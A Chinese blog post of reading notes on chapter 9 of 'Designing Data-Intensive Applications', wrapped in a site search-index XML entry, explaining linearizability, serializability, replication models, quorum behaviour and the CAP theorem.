<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DDIA 阅读笔记第九章：一致性与共识</title>
    <url>/blog/2024/06/11/DDIA-Note-9/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本章讨论了分布式系统中的一致性和共识。一致性是对结果的保证，例如线性一致性，保证了每次读取都可以读到最新版本的数据。共识则是达成一致的过程，基于特定的共识算法。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>分布式系统中的许多事情可能会出错。处理这种故障的最简单方法是让整个服务失效，并向用户显示错误消息。如果无法接受这个解决方案，就需要找到容错的方法 —— 即使某些内部组件出现故障，服务也能正常运行。</p>
<p>在本章中，我们将讨论构建容错分布式系统的算法和协议的一些例子。我们将假设第 8 章的所有问题都可能发生：</p>
<ul>
<li>网络：数据包可能会丢失、乱序、重复、延迟</li>
<li>时钟同步：存在漂移，尽可能近似</li>
<li>节点下线：可能暂停（例如，垃圾回收）或随时崩溃</li>
</ul>
<p><mark style="background: #BBFABBA6;">构建容错系统的最好方法，是找到一些<strong>具有实用保证的通用抽象</strong>，实现一次，然后<strong>基于这些保证构建应用</strong></mark>。这与第 7 章中的事务处理方法相同：通过使用事务，应用可以假装没有崩溃（原子性），没有其他人同时访问数据库（隔离），存储设备是完全可靠的（持久性）。即使发生崩溃，竞态条件和磁盘故障，<strong>事务抽象隐藏了这些问题</strong>，因此应用不必担心它们。</p>
<p>同样地，本章寻求可以让应用忽略分布式系统部分问题的抽象概念。例如，<mark style="background: #FFF3A3A6;">分布式系统最重要的抽象之一就是共识（consensus）：就是让所有的节点对某件事达成一致</mark>。由于存在网络故障和流程故障，可靠地达成共识是一个棘手的问题。</p>
<p>一旦有了共识的实现，应用可以将其用于各种目的。例如，在单主复制的数据库中，主库下线时，剩余数据库节点可以使用共识来选举新的领导者：</p>
<ul>
<li>重要的是只有一个主库，且所有的节点都认同其作为主库</li>
<li><mark style="background: #FF5582A6;">如果两个节点都认为自己是主库，这种情况被称为<strong>脑裂（split brain）</strong>，且经常导致数据丢失</mark>。正确实现共识有助于避免这种问题。</li>
</ul>
<p>在本章后面的 “分布式事务和共识” 中，我们将研究解决共识和相关问题的算法。但首先，我们需要探索可以在分布式系统中提供的保证和抽象的范围。</p>
<p>我们需要理解容错的边界：在某些情况下，系统可以容忍故障继续运行；其他情况则不能。我们将通过<strong>理论证明</strong>和<strong>具体实现</strong>来深入探讨这些边界限制，并对诸多基本限制进行概览式串讲。</p>
<h3 id="一致性保证">一致性保证</h3>
<p>在 “复制延迟问题” 中，我们看到了数据库复制中发生的一些时序问题。如果你在同一时刻查看两个数据库节点，则可能在两个节点上看到不同的数据，因为写请求在不同的时间到达不同的节点。无论数据库使用何种复制方法（单主复制，多主复制或无主复制），都会出现这些不一致情况。</p>
<p>大多数复制的数据库至少提供了<strong>最终一致性</strong>，这意味着如果你停止向数据库写入数据并等待一段不确定的时间，那么最终所有的读取请求都会返回相同的值。</p>
<ul>
<li>换句话说，不一致性是暂时的，最终会自行解决（假设网络中的任何故障最终都会被修复）。</li>
<li><mark style="background: #FFF3A3A6;">最终一致性的一个更好的名字可能是<strong>收敛（convergence）</strong>，因为预计所有的副本最终会收敛到相同的值</mark>。</li>
</ul>
<p>然而，这是一个非常弱的保证 —— 它并没有说什么什么时候副本会收敛。<mark style="background: #FF5582A6;">在收敛之前，读操作可能会返回任何东西或什么都没有</mark>。例如，如果你写入了一个值，然后立即再次读取，这并不能保证你能看到刚跟写入的值，因为读请求可能会被路由到另外的副本上。（参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#%E8%AF%BB%E5%B7%B1%E4%B9%8B%E5%86%99">读己之写</a>” ）。</p>
<p>对于应用开发人员而言，最终一致性是很困难的，因为它<mark style="background: #FFF3A3A6;">与普通单线程程序中变量的行为有很大区别</mark>。如果将一个值赋给一个变量，然后很快地再次读取，你不会认为可能读到旧的值，或者读取失败。数据库表面上看起来像一个你可以读写的变量，但实际上它有更复杂的语义。</p>
<p>在与只提供弱保证的数据库打交道时，你需要<mark style="background: #FFF3A3A6;">始终意识到它的局限性，而不是意外地作出太多假设</mark>。错误往往是微妙的，很难找到，也很难测试，因为应用可能在大多数情况下运行良好。当系统出现故障（例如网络中断）或高并发时，最终一致性的边缘情况才会显现出来。</p>
<p>本章将探索数据系统可能选择提供的更强一致性模型。</p>
<ul>
<li>强一致性不是免费的：相较于弱保证系统，具有较强保证的系统可能会具有更差的性能或更少的容错性。</li>
<li>尽管如此，更强的保证也有吸引力，因为它们更容易用对。</li>
<li><mark style="background: #BBFABBA6;">只有了解不同的一致性模型后，才能确定哪个最适合自己的需求</mark>。</li>
</ul>
<p><strong>分布式一致性模型</strong>和之前讨论的事务隔离级别有一些相似之处，但它们是无关的问题：</p>
<ul>
<li>事务隔离主要是为了，<strong>避免由于同时执行事务而导致的竞争状态</strong></li>
<li>分布式一致性主要关于，<strong>面对延迟和故障时，如何协调副本间的状态</strong></li>
</ul>
<p>本章涵盖了广泛而又紧密联系的多个话题：</p>
<ul>
<li>常用的<strong>最强一致性模型</strong>之一，<strong>线性一致性（linearizability）</strong>，考察其优缺点。</li>
<li>检查分布式系统中<a href="https://vonng.gitbooks.io/ddia-cn/content/ch9.html#%E9%A1%BA%E5%BA%8F%E4%BF%9D%E8%AF%81"><strong>事件顺序</strong></a>的问题，特别是因果关系和全局顺序的问题。</li>
<li>将探讨如何原子地提交分布式事务，走向共识问题的解决方案。</li>
</ul>
<h2 id="线性一致性"><strong>线性一致性</strong></h2>
<p>在<strong>最终一致</strong>的数据库，如果你在同一时刻问两个不同副本相同的问题，可能会得到两个不同的答案。这很让人困惑。如果数据库可以提供只有一个副本的假象（即，只有一个数据副本），那么事情就简单太多了。那么每个客户端都会有相同的数据视图，且不必担心复制滞后了。</p>
<p>这就是<strong>线性一致性（linearizability）</strong>背后的想法。线性一致性的精确定义相当微妙，我们将在本节的剩余部分探讨它。但是基本的想法是<mark style="background: #BBFABBA6;">让一个系统看起来好像只有一个数据副本，而且所有的操作都是原子性的</mark>。有了这个保证，即使实际中可能有多个副本，应用也不需要担心它们。</p>
<blockquote>
<p>线性一致性，也称为<strong>原子一致性（atomic consistency）</strong>，<strong>强一致性（strong consistency）</strong>，<strong>立即一致性（immediate consistency），或</strong>外部一致性（external consistency ）。</p>
</blockquote>
<p>在一个线性一致的系统中，只要一个客户端成功完成写操作，所有客户端从数据库中读取数据必须能够看到刚刚写入的值。要维护数据的单个副本的假象，系统应<mark style="background: #BBFABBA6;">保障读到的值是最近的、最新的</mark>，而不是来自陈旧的缓存或副本。换句话说，线性一致性是一个 &nbsp;<strong>新鲜度保证（recency guarantee）</strong>。为了阐明这个想法，我们来看看一个非线性一致系统的例子。</p>
<p><img src="ch09-fig01.png"></p>
<p><strong>图 9-1 这个系统是非线性一致的，导致了球迷的困惑</strong></p>
<p>上图展示了一个关于体育网站的非线性一致例子。Alice 和 Bob 正坐在同一个房间里，都盯着各自的手机，关注着 2014 年 FIFA 世界杯决赛的结果。在最后得分公布后，Alice 刷新页面，看到宣布了获胜者，并兴奋地告诉 Bob。Bob 难以置信地刷新了自己的手机，但他的请求路由到了一个落后的数据库副本上，手机显示比赛仍在进行。</p>
<p>如果 Alice 和 Bob 在同一时间刷新并获得了两个不同的查询结果，也许就没有那么令人惊讶了。因为<mark style="background: #FFF3A3A6;">他们不知道服务器处理他们请求的精确时刻</mark>。然而 Bob 是在听到 Alice 惊呼最后得分<strong>之后</strong>，点击了刷新按钮（启动了他的查询），因此<mark style="background: #FFF3A3A6;">他希望查询结果至少与 Alice 一样新鲜</mark>。但他的查询返回了陈旧结果，这一事实违背了线性一致性的要求。</p>
<h3 id="什么使得系统线性一致"><strong>什么使得系统线性一致？</strong></h3>
<p>线性一致性背后的基本思想很简单：使系统看起来好像只有一个数据副本。然而确切来讲，实际上有更多要操心的地方。为了更好地理解线性一致性，让我们再看几个例子。</p>
<p>图 9-2 展示了三个客户端在线性一致数据库中同时读写相同的键 <code>x</code>。在分布式系统文献中，<code>x</code> 被称为<strong>寄存器（register）</strong>，例如，它可以是键值存储中的一个<strong>键</strong>，关系数据库中的一<strong>行</strong>，或文档数据库中的一个<strong>文档</strong>。</p>
<p><img src="ch09-fig02.png"></p>
<p><strong>图 9-2 如果读取请求与写入请求并发，则可能会返回旧值或新值</strong></p>
<p>为了简单起见，图 9-2<mark style="background: #FFF3A3A6;"> 采用了用户请求的视角，而不是数据库内部的视角</mark>。每个柱都是由客户端发出的请求，其中柱头是请求发送的时刻，柱尾是客户端收到响应的时刻。因为网络延迟变化无常，<mark style="background: #FFF3A3A6;">客户端不知道数据库处理其请求的精确时间 —— 只知道它发生在发送请求和接收响应的之间的某个时刻</mark>。</p>
<p>这个图的一个微妙的细节是它假定存在一个全局时钟，由水平轴表示。即使真实的系统通常没有准确的时钟（请参阅 “<a href="http://ddia.vonng.com/#/ch8?id=%e4%b8%8d%e5%8f%af%e9%9d%a0%e7%9a%84%e6%97%b6%e9%92%9f">不可靠的时钟</a>”），但这种假设是允许的：为了分析分布式算法，我们<mark style="background: #FFF3A3A6;">可以假设一个精确的全局时钟存在，不过算法无法访问它</mark>。算法只能看到由石英振荡器和 NTP 产生的实时逼近。</p>
<p>在这个例子中，寄存器有两种类型的操作：</p>
<ul>
<li><span class="math inline">\(read(x)⇒v\)</span> 表示客户端请求读取寄存器 &nbsp;<code>x</code>&nbsp; 的值，数据库返回值 &nbsp;<code>v</code>。</li>
<li><span class="math inline">\(write(x,v)⇒r\)</span> 表示客户端请求将寄存器 &nbsp;<code>x</code>&nbsp; 设置为值 &nbsp;<code>v</code>&nbsp;，数据库返回响应 &nbsp;<code>r</code>&nbsp;（可能正确，可能错误）。</li>
</ul>
<p>在图 9-2 中，<code>x</code>&nbsp; 的值最初为 &nbsp;<code>0</code>，客户端 C 执行写请求将其设置为 &nbsp;<code>1</code>。发生这种情况时，客户端 A 和 B 反复轮询数据库以读取最新值。 A 和 B 的请求可能会收到怎样的响应？</p>
<ul>
<li>客户端 A 的第一个读操作，完成于写操作开始之前，因此必须返回旧值 &nbsp;<code>0</code>。</li>
<li>客户端 A 的最后一个读操作，开始于写操作完成之后。如果数据库是线性一致性的，它必然返回新值 &nbsp;<code>1</code>：因为读操作和写操作一定是在其各自的起止区间内的某个时刻被处理。如果在写入结束后开始读取，则必须在写入之后处理读取，因此它必须看到写入的新值。</li>
<li>与写操作在时间上重叠的任何读操作，可能会返回 &nbsp;<code>0</code>&nbsp; 或 &nbsp;<code>1</code>&nbsp;，因为我们不知道读取时，写操作是否已经生效。这些操作是<strong>并发（concurrent）</strong>的。</li>
</ul>
<p>但是，这还不足以完全描述线性一致性：如果与写入同时发生的读取可以返回旧值或新值，那么<mark style="background: #FF5582A6;">读者可能会在写入期间看到数值在旧值和新值之间来回翻转</mark>。这不是我们所期望的仿真 “单一数据副本” 的系统。</p>
<blockquote>
<p>如果读取（与写入同时发生时）可能返回旧值或新值，则称该寄存器为 &nbsp;<strong>常规寄存器（regular register）</strong></p>
</blockquote>
<p>为了使系统线性一致，我们需要添加另一个约束，如图 9-3 所示</p>
<p><img src="ch09-fig03.png"></p>
<p>** 图 9-3 <mark style="background: #BBFABBA6;">任何一个读取返回新值后，所有后续读取（在相同或其他客户端上）也必须返回新值</mark></p>
<p>在一个线性一致的系统中，我们可以想象，在 &nbsp;<code>x</code>&nbsp; 的值从 <code>0</code>&nbsp; 自动翻转到 &nbsp;<code>1</code>&nbsp; 的时候（在写操作的开始和结束之间）必定有一个时间点。因此，如果一个客户端的读取返回新的值 &nbsp;<code>1</code>，即使写操作尚未完成，所有后续读取也必须返回新值。</p>
<p>图 9-3 中的箭头说明了这个时序依赖关系。客户端 A 是第一个读取新的值 &nbsp;<code>1</code>&nbsp; 的位置。在 A 的读取返回之后，B 开始新的读取。由于 B 的读取严格在发生于 A 的读取之后，因此即使 C 的写入仍在进行中，也必须返回 &nbsp;<code>1</code>。 （与图 9-1 中的 Alice 和 Bob 的情况相同：在 Alice 读取新值之后，Bob 也希望读取新的值。）</p>
<p>我们可以进一步细化这个时序图，展示每个操作是如何在特定时刻原子性生效的。图 9-4 显示了一个更复杂的例子，除了读写之外，还增加了第三种类型的操作：</p>
<ul>
<li><span class="math inline">\(cas(x, v_{old}, v_{new})⇒r\)</span> 表示客户端请求进行原子性的 CAS 操作。如果寄存器 <span class="math inline">\(x\)</span> 的当前值等于 <span class="math inline">\(v_{old}\)</span> ，则应该原子地设置为 <span class="math inline">\(v_{new}\)</span> 。如果 <span class="math inline">\(x≠v_{old}\)</span> ，则操作应该保持寄存器不变并返回一个错误。 <span class="math inline">\(r\)</span> 是数据库的响应（正确或错误）。</li>
</ul>
<p>上图中的所有请求都被关联上了一条竖线（在每个操作的时间条中），我们认为对应的操作在此时刻真正发生。所有的标记组成一种执行顺序，该顺序必须满足寄存器的<strong>读写特性</strong>（所有的读必须能返回最近的写）。</p>
<p>线性一致性的要求是，操作标记的连线总是按时间（从左到右）向前移动，而不是向后移动。这个要求确保了我们之前讨论的新鲜性保证：一旦新的值被写入或读取，所有后续的读都会看到写入的值，直到它被再次覆盖。</p>
<p><img src="ch09-fig04.png"></p>
<p><strong>图 9-4 可视化读取和写入看起来已经生效的时间点。 B 的最后读取不是线性一致性的</strong></p>
<p>图 9-4 中有一些有趣的细节需要指出：</p>
<ol type="1">
<li><strong>B 读到 “稍后” 的值</strong>。开始时，客户端 B 首先发出一个针对 x 的读请求，然后客户端 D 发出一个设置 x = 0 的写请求，紧接着，客户端 A 发出了另一个设置 x = 1 的写请求。然后 B 读到的值却是 1。这样是合法的，并且说明数据库先处理了 D（设置 x = 0）的写请求、接着处理了 A 的写请求，最后是 B 的读请求。尽管这个序列不符合请求发出的时间点先后，但这是一个可以接受的顺序，<strong>因为这三个请求本质上并发的，因此事实上谁先谁后被处理都有可能</strong>。比如，有可能是客户端 B 的请求在网络中延迟了一些，以至于在两个写之后才被处理。</li>
<li><strong>客户端 A 写请求还没结束，客户端 B 就读到了其写的值 1</strong>。这也是合法的：<mark style="background: #FFF3A3A6;">这并不是说 B 在 A 写成功之前读到了，而只是说明 A 的写操作的正确响应<strong>有一些延迟</strong></mark>。</li>
<li><strong>这个模型对隔离性没有任何假设</strong>：客户端可能在任何时刻更改值，并且能被其他客户端看到。例如，C 两次读取，第一次读到 1 第二次读到 2，这是因为两次读取间 B 修改了 x。使用原子的 CAS 操作可以在修改 x 的值时，避免被其他客户端并发的修改。B 和 C 的 CAS 请求成功了，但是 D 的 CAS 请求失败了（因为数据库处理其 CAS 时，x 的值已经不是 0 了）。</li>
<li><strong>B 的最后一个读请求不满足线性一致</strong>。该请求和 C 的 CAS 写是并发的，C 的 CAS 将 x 从 2 更新到了 4。如果没有其他操作，B 读到 2 是合法的。但是客户端 A 读到了 4，并且在 B 请求开始前就返回了，因此 B 不允许读到比 A 更老的值。这个也和之前 Alice 和 Bob 的例子类似。</li>
</ol>
<blockquote>
<p>线性一致性与可序列化</p>
<p><strong>线性一致性</strong>容易和可序列化相混淆，因为两个词似乎都是类似 “可以按顺序排列” 的东西。但它们是两种完全不同的保证，区分两者非常重要：</p>
<p><em><strong>可序列化</strong></em></p>
<p><strong>可序列化（Serializability）</strong>是<mark style="background: #BBFABBA6;">事务的隔离属性</mark>，每个事务可以读写多个对象（行，文档，记录）—— 参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch7.html#%E5%8D%95%E5%AF%B9%E8%B1%A1%E5%92%8C%E5%A4%9A%E5%AF%B9%E8%B1%A1%E6%93%8D%E4%BD%9C">单对象和多对象操作</a>”。它确保事务的行为，与它们按照<strong>某种</strong>顺序依次执行的结果相同（每个事务在下一个事务开始之前运行完成）。这种执行顺序可以与事务实际执行的顺序不同。</p>
<p><em><strong>线性一致性</strong></em></p>
</blockquote>
<blockquote>
<p>线性一致性（Linearizability）是<mark style="background: #BBFABBA6;">读写寄存器的新鲜度保证</mark>。它不会将操作组合为事务，因此它也不会阻止写偏差等问题（参阅 “写偏差和幻读”），除非采取其他措施（例如物化冲突）。</p>
<p>一个数据库可以提供可串行性和线性一致性，这种组合被称为严格的可串行性或强的<strong>单副本强可串行性（strong-1SR）</strong>。基于两阶段锁定的可串行化实现或 ** 实际串行执行通常是线性一致性的。</p>
<p>但是，可序列化的快照隔离不是线性一致性的：按照设计，它可以<mark style="background: #FFF3A3A6;">从一致的快照中进行读取</mark>，以避免锁定读者和写者之间的争用。一致性快照的要点就在于<strong>它不会包括比快照更新的写入</strong>，因此从快照读取不是线性一致性的。</p>
</blockquote>
<h3 id="应用线性一致性"><strong>应用线性一致性</strong></h3>
<p>线性一致性在什么情况下有用？观看体育比赛的最后得分可能是一个轻率的例子：过了几秒钟的结果不可能在这种情况下造成任何真正的伤害。然而<mark style="background: #BBFABBA6;">对于少数领域，线性一致性是系统正确工作的重要条件</mark>。</p>
<h4 id="锁定和领导选举"><strong>锁定和领导选举</strong></h4>
<p>一个使用单主复制的系统，需要确保领导真的只有一个，而不是几个（脑裂）。一种选择领导者的方法是使用锁：每个节点在启动时尝试获取锁，成功者成为领导者。<mark style="background: #FFF3A3A6;">不管这个锁是如何实现的，它必须是线性一致的：所有节点必须就哪个节点拥有锁达成一致，否则就没用了</mark>。</p>
<p>像 Apache Zookeeper 和 Etcd 之类的协调服务（Coordination services）通常用来实现分布式锁和主选举。他们通常使用共识算法来实现线性一致性操作，并且能够进行容错。当然，在此之上，为了正确的实现锁服务和主选举，还需要讨论一些非常微妙的细节。像 &nbsp;<a href="https://github.com/apache/curator">Apache Curator</a>&nbsp; 等库可以基于 Zookeeper 提供高层的协调服务抽象。但是，一个提供线性一致性保证的存储服务是实现这些协调任务的<strong>基础</strong>。</p>
<blockquote>
<p>严格地说，ZooKeeper 和 etcd 提供线性一致性的写操作，但读取可能是陈旧的，因为默认情况下，它们可以由任何一个副本提供服务。你可以选择请求线性一致性读取：etcd 称之为 &nbsp;<strong>法定人数读取（quorum read）</strong>【16】，而在 ZooKeeper 中，你需要在读取之前调用 &nbsp;<code>sync()</code>。</p>
</blockquote>
<p>分布式锁也在一些分布式数据库（如 Oracle Real Application Clusters（RAC））中以更细的粒度使用。 RAC 对每个磁盘页面使用一个锁，多个节点共享对同一个磁盘存储系统的访问权限。由于这些线性一致的锁处于事务执行的关键路径上，RAC 部署通常具有用于数据库节点之间通信的专用集群互连网络。</p>
<h4 id="约束和唯一性保证">约束和唯一性保证</h4>
<p><strong>唯一性约束</strong>在数据库中很常见：比如用户名和邮箱可以用来唯一的标识一个用户、在同一个文件系统中不可能有多个文件具有相同的路径和文件名。如果你想在数据写入时<strong>维持这些约束</strong>（比如两个人使用相同的用户名并发地创建账户，其中一个会失败而报错），你需要线性一致性。</p>
<p>这个情形和锁的语义非常类似：当一个用户注册时，可以认为他获得了一个和所注册的用户名关联的 “锁”。这个操作很像原子的 CAS：如果该用户名没有被使用，就将其分配给该用户。</p>
<p>在以下几种情况也会面临类似的问题：</p>
<ol type="1">
<li>保证银行账户余额不会出现负值</li>
<li>不可能卖出比持仓多的股票数目</li>
<li>任意两个用户不可能同时预定到相同的航班或者剧院座位</li>
</ol>
<p>这些约束都要求所有节点在<strong>单个最新值</strong>（账户余额、股票水位、座位预定）上达成一致。</p>
<p>当然，在真实场景下，有时这些约束可以被适当放宽（比如，如果机票座位被超订了，可以将其中一个用户移到其他航班，并给予适当补偿）。在这种情况下，可能不需要严格的线性一致性，稍后我们会在及时性和完整性一节讨论这些放松的约束。</p>
<p>然而，一个硬性的<mark style="background: #FFF3A3A6;">唯一性约束（关系型数据库中常见的那种）需要线性一致性</mark>。其他类型的约束，如外键或属性约束，可以不需要线性一致性。</p>
<h4 id="跨信道的时序依赖"><strong>跨信道的时序依赖</strong></h4>
<p>在图 9-1 中我们可以注意到一个细节：如果 Alice 没有说出决赛结果，Bob 就不会知道他看到的是过时的结果。如果 Bob 没有从 Alice 那里事先知道结果，他可能就会过几秒再刷新一次页面，最终会看到最终分数。也就是说，<mark style="background: #BBFABBA6;">因为存在一个<strong>额外的通信渠道</strong>（addional communication chanel），导致我们注意到了系统不满足线性一致性</mark>。</p>
<p>计算机系统中也有类似的问题。例如，一个可以让用户上传照片的网站，有个后台进程会将照片进行压缩以支持快速加载（缩略图）。架构图如下：</p>
<p><img src="ch09-fig05.png"></p>
<p><strong>图片调整服务</strong>（image resizer）需要显式的指定任务，任务指令是通过消息队列由 web 服务器发给图片调整服务。但由于消息队列是针对短小消息（1kb 以下）而设计的，而图片通常有数 M，因此不能直接将图片发送到消息队列。而是，首先将图片写入<strong>文件存储服务</strong>（File Storage Service），然后将包含<strong>该文件路径</strong>的<strong>调整请求</strong>发送到消息队列中。</p>
<p>如果文件存储服务是线性一致的，则这个系统能正常运作。但如果他不是，则<mark style="background: #FF5582A6;">可能会存在竞态条件：<strong>消息队列可能会比文件存储服务内部多副本同步要快</strong></mark>。在这种情况下，当图片调整服务去文件存储服务中捞照片时，就会发现一个旧照片、或者照片不存在。<mark style="background: #FF5582A6;">如果调整服务看到的是旧照片，却以为是新的，然后把它调整了并且存回了存储服务，就会出现永久的不一致</mark>。</p>
<p>出现这种情况是因为在 web 服务器和图片调整服务中间存在两条<strong>不同的通信渠道</strong>（communication channels）：<strong>存储系统和消息队列</strong>。<mark style="background: #FFF3A3A6;">如果没有线性一致性提供的新鲜度保证，两条通信渠道就有可能发生竞态条件（race condition）</mark>。这也和图 9-1 的情况类似，在那个场景中，也存在着两条有竞态条件的通信渠道：数据库多副本同步渠道和 Alice 的嘴到 Bob 的耳朵的声音传播。</p>
<p>可线性化不是唯一避免静态条件的方式，但它是最易理解的。如果你能控制所有的通信渠道（如 9-5 中的消息队列，但 9-1 中的两人交谈就不行，因为在系统外），就可以使用类似<strong>读己之写</strong>一节中所提到的手段来解决这种竞态条件。如读走 leader、使用时间戳等等增加系统复杂度的方法来换取线性一致性。</p>
<h3 id="实现线性一致的系统"><strong>实现线性一致的系统</strong></h3>
<p>线性一致性的本质是在说：<strong><mark style="background: #BBFABBA6;">系统表现得像只有一个数据副本，且所有施加于其上的操作都会原子性（瞬间）的完成</mark></strong>。最简单的实现方式就是真的只用一个数据副本。但其问题在于，不能容错：一旦该副本挂了，轻则长时间（重启之前）不可用、重则数据丢失。</p>
<p>最常用的让系统进行容错的方式就是多副本。让我们回顾下第五章的几种多副本模型，然后逐一考察下其是否能够做成可线性化的：</p>
<ul>
<li><mark style="background: #BBFABBA6;"><strong>单主复制</strong>（Single-leader replication） ，可能线性一致</mark>。在一个单主模型的系统中，主副本服务于写请求，其他副本负责备份。如果让读取也走主副本，或者使用同步更新从副本的策略，则该系统<strong>有可能</strong>满足线性一致性。
<ul>
<li>但是，并不是所有单主模型的数据都提供线性一致性，有时候是故意的（比如提供快照隔离），有时候是由于并发 bug。 想让主副本也负责读请求，首先我们得确切知道哪一个是主副本。就像我们在 “<strong>真相由多数节点定义</strong>” 一节中提到的，很有可能某个节点认为他是主节点，但其事实上不是。如果这个<strong>自以为是的主节点</strong>（delusional leader）继续提供服务，则系统很可能会违反线性一致性。</li>
<li>如果使用异步同步策略，节点宕机可能甚至会丢数据，从而不仅违反线性一致性，也违反了可持久性。</li>
</ul></li>
<li><mark style="background: #BBFABBA6;"><strong>共识算法</strong>（Consensus algorithms） ，线性一致</mark>。我们本章稍后会讨论到，有一些共识算法，看起来与单主模型类似。但这些共识协议有一些阻止脑裂和过期副本的手段。由于这些额外细节，共识算法可以实现安全的线性一致性存储。Zookeeper 和 etcd 就是用的这种手段。</li>
<li><mark style="background: #FF5582A6;"><strong>多主模型</strong>（Multi-leader replication） ，非线性一致</mark>。由于可以同时在多个节点上处理写入，并且异步同步写入数据，使用多主模型的系统通常不是线性一致的。由于上述原因，这种系统可能会产生需要手动解决的写入冲突。这种冲突便是违反线性一致性要求的一个点：表现得像一个副本。</li>
<li><mark style="background: #FFF3A3A6;"><strong>无主模型</strong>（Leader replication） ，也许不是线性一致的</mark>。
<ul>
<li>使用无主模型的系统（Dynamo-style），厂商有时候会声称可以通过使用法定数目读写（Quorum reads and write，w+r &gt; n）来获得强一致性。这个说法有点模糊，并不总是正确，这取决于你对法定节点的配置，也取决于你如何定义强一致性。</li>
<li>“后者胜”（Last write win）的冲突解决方法会依赖于多个机器的挂历时钟（time-of-day），由于多机时钟存在偏差，其<mark style="background: #FF5582A6;">物理时间戳不能保证和系统事件顺序一致，因此基本上不可能做到线性一致</mark>。宽松的法定策略也是破坏了线性一致性。即使对于严格的法定策略，非线性一致的现象也可能出现，下一节将会详细探讨。</li>
</ul></li>
</ul>
<h4 id="线性一致和法定策略quorum"><strong>线性一致和法定策略（Quorum）</strong></h4>
<p><mark style="background: #FFF3A3A6;">从直觉出发，在 Dynamo 风格的系统中使用严格的 Quorum 读写应该会满足线性一致性。但在具有不确定延迟的网络中，仍然可能会出现竞态条件</mark>。如下图所示：</p>
<p><img src="ch09-fig06.png"></p>
<p>在图 9-6 中，x 的初始值是 0。然后一个客户端想将 x 更新为 1，然后将该写请求发送到所有三个副本（n=3, w=3）。与此同时，客户端 A 使用 r = 2 的配置进行 Quorum 读，并且看到了新值 1。稍后，客户端 B 也是用 r = 2 的配置在另外两个节点进行 Quorum 读，但却读到了旧值 0。</p>
<p>Quorum 的配置是严格满足 w+r&gt;n 的，然而这个读写序列却不是线性一致的：<mark style="background: #FF5582A6;"><strong>B 的读取请求开始于 A 的读请求结束之后，却读到了比 A 旧的值</strong></mark>。</p>
<p>当然，有趣的是，我们可以通过牺牲部分性能来让 Dynamo 风格的 Quorum 读写变成线性一致的：</p>
<ol type="1">
<li>每个读请求必须进行同步的<a href="https://ddia.qtmuniao.com/#/ch05?id=%e8%af%bb%e6%97%b6%e4%bf%ae%e5%a4%8d%e5%92%8c%e5%8f%8d%e7%86%b5"><strong>读取修复</strong></a>，这<mark style="background: #BBFABBA6;">保证了后续读请求读到的值一定更新</mark>，但会增加延迟。</li>
<li>发送任意写请求之前要先读取最新值。</li>
</ol>
<p>但由于性能原因 Riak 并没有采用同步的读取修复；Cassandra 倒是会同步读取修复，但在多个请求并发写入同一个 key 时，由于采用了后者胜的策略（考虑时钟，会导致接受顺序不是真正事件发生顺序），仍然不能保持线性一致性。</p>
<p>此外，这种方式只能实现线性一致的读写操作，而不能实现线性一致的 CAS 操作。只有共识协议才能实现线性一致的 CAS。</p>
<p>总结来说，<mark style="background: #BBFABBA6;">最好认为基于无主模型的 Dynamo 风格的系统不提供线性一致性保证</mark>。</p>
<h3 id="线性一致性的代价"><strong>线性一致性的代价</strong></h3>
<p>可以看出有些系统提供线性一致性保证，有一些却不提供。因此我们很容易好奇：线性一致性系统的优缺点是什么，接下来我们深入探讨一下。</p>
<p>在<strong>第五章</strong>的时候我们讨论了一些使用不同副本策略的实际场景。如，对于跨数据中心（详见<strong>多数据中心</strong>一节）的系统来说，多主模型通常是一个好的选择。下图是一个例子：</p>
<p><img src="ch09-fig07.png"></p>
<p>考虑这样一种情况：如果<mark style="background: #FFF3A3A6;">两个数据中心之间发生网络中断</mark>会发生什么？我们假设每个数据中心内的网络正在工作，客户端可以访问数据中心，但数据中心之间彼此无法互相连接。</p>
<ul>
<li>多主模型：由于向其他数据中心的数据传输是异步的，<mark style="background: #BBFABBA6;">每个数据中心仍能正常工作</mark>，只是由于数据中心间网络的问题，所有数据同步都被排队了起来，待到网络恢复就会重新发出。</li>
<li>单主模型：主节点只会存在于某个特定的数据中心，<mark style="background: #FFF3A3A6;">所有的写入和线性化的读都会被路由到该主节点</mark>。对于所有直接打到从数据中心的客户端请求，都必须被通过网络同步的路由给主数据中心。
<ul>
<li>在单主配置的条件下，如果数据中心之间的网络被中断，则<mark style="background: #FF5582A6;">连接到从库数据中心的客户端无法联系到主库，因此它们无法对数据库执行任何写入，也不能执行任何线性一致的读取</mark>。它们仍能从从库读取，但结果可能是陈旧的（非线性一致）。如果应用需要线性一致的读写，却又位于与主库网络中断的数据中心，则网络中断将导致这些应用不可用。</li>
<li>如果客户端能直连主数据中心，则上述问题不存在。但<mark style="background: #FF5582A6;">如果客户端只能连接到从数据中心，就会在网络修复前经历一段时间的不可用</mark>。</li>
</ul></li>
</ul>
<h4 id="cap-定理"><strong>CAP 定理</strong></h4>
<p>该问题不止是采用单主模型和多主模型的不同策略所导致的：<strong>不管其实现方式如何，任何想要提供线性一致性的系统都会面临上述取舍问题</strong>。该问题也不止局限于跨数据中心部署，即使是在一个数据中心之内，任何通过不可靠网络连接的系统都会有该问题。其背后的<strong>取舍考量</strong>如下：</p>
<ul>
<li>如果应用需要线性一致性，且某些副本因为网络问题与其他副本断开连接，那么这些副本<mark style="background: #FF5582A6;">掉线时不能处理请求</mark>。请求必须等到网络问题解决，或直接返回错误。无论哪种方式，服务都 &nbsp;<strong>不可用</strong>。</li>
<li>如果应用不需要线性一致性，那么某个副本即使与其他副本断开连接，也可以独立处理请求（例如多主复制）。在这种情况下，<mark style="background: #FFF3A3A6;">应用可以在网络问题前保持可用，但其行为不是线性一致的</mark>。</li>
</ul>
<blockquote>
<p>这两种选择有时分别称为 CP（在网络问题下一致但不可用）和 AP（在网络问题下可用但不一致）。 但是，这种分类方案存在一些缺陷，所以最好不要这样用。</p>
</blockquote>
<p>总而言之，<strong>如果系统不提供线性一致性，就可以对网络故障更加鲁棒</strong>。该洞见常被称为 &nbsp;<strong>CAP 定理</strong>，于 2000 年被 Eric Brewer 提出。不过，类似的取舍考量从 1970 年代就为分布式数据的设计人员所熟知了。</p>
